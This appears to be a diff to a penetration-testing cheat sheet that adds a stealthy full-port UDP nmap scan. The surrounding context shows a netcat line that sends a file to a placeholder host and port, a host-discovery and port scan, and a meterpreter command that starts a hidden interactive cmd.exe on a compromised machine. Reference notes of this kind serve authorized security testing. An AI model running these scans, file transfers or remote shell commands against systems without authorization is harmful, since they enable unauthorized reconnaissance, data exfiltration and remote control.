@@ -69,6 +69,8 @@ netcat host port < file
 ---| nmap |---
 nmap -sSU -sP -PS20,21,22,23,25,37,53,57,110,135,137,139,80,8080, -p U:53,67,68,69,111,123,137,161,T:21-25,80,110,115,135,137,138,139,162,179,389,443,445,1521,3389,5432,8080
 
+nmap -v -sU -T2 --max-rtt-timeout 250ms --initial-rtt-timeout 150ms --max-scan-delay 10s --max-retries 1 -p1-65535 -n -Pn -oA
+
 ---| meterpreter |---
 execute -f cmd.exe -i -H
 
